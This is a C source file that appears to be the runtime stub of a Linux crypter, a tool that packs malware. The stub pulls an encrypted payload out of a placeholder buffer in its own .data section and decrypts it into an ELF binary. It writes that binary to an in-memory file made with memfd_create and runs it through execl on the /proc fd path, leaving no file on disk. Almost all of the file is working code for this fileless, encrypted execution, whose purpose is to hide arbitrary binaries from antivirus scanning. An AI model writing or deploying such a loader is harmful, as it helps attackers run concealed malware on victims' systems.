#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include "crypter.h"
#include "encryption.h"
#include "elf_utils.h"

#define IN_MEMORY_FILE_NAME "myfile"
#define PROCESS_NAME "stub_test"

// Used to allocate space in the ELF .data section, so we need to initialize it.
// This buffer will be replaced with the encrypted payload by the crypter
uint8_t buf[CRYPTER_MAX_PAYLOAD_SIZE] = { 'A', 'B', 'C', 'D', 'E', 'F' };

static uint8_t *read_payload(size_t *payload_size);

int main(void)
{
	// TODO: Use shared memory alternative (mmap or shmget) if it's an old kernel
	// using preprocessor macros
	int memfd = memfd_create(IN_MEMORY_FILE_NAME, MFD_CLOEXEC);
	if (memfd == -1) {
		perror("memfd_create");
		return -1;
	}

	// Read the payload
	size_t payload_size;
	uint8_t *payload = read_payload(&payload_size);
	if (!payload) {
		return -1;
	}

	printf("Read encrypted payload of size: %ld\n", payload_size);

	// Decrypt the payload to get the original ELF file
	size_t elf_size;
	uint8_t *elf_file = decrypt(payload, payload_size, g_encryption_key, sizeof(g_encryption_key), &elf_size);
	if (!elf_file) {
		fprintf(stderr, "Failed to decrypt the payload\n");
		return -1;
	}

	// Check if the payload is a valid ELF
	if (!is_elf(elf_file, elf_size)) {
		fprintf(stderr, "The payload is not a valid ELF\n");
		return -1;
	}

	printf("Decrypted ELF size is: %ld\n", elf_size);

	// Write ELF to the FD opened in memory
	write(memfd, elf_file, elf_size);
	free(elf_file);

	// Execute the in-memory file
	char memfd_path[64];
	sprintf(memfd_path, "/proc/%d/fd/%d", getpid(), memfd);

	printf("RUNNING...\n\n");
	execl(memfd_path, PROCESS_NAME, NULL);

	return 0;
}

uint8_t *read_payload(size_t *payload_size)
{
	*payload_size = 0;

	// Check if something has been written by the crypter
	uint8_t initial_data[] = { 'A', 'B', 'C', 'D', 'E', 'F' };
	if (memcmp(buf, initial_data, sizeof(initial_data)) == 0) {
		fprintf(stderr, "No payload found\n");
		return NULL;
	}

	// Read the payload size written by the crypter at the first
	// bytes of buf
	size_t payload_size_in_buf = *(size_t *) buf;
	if (payload_size_in_buf == 0 || payload_size_in_buf > CRYPTER_MAX_PAYLOAD_SIZE - sizeof(size_t)) {
		fprintf(stderr, "Invalid payload size\n");
		return NULL;
	}

	*payload_size = payload_size_in_buf;
	return buf + sizeof(size_t);
}
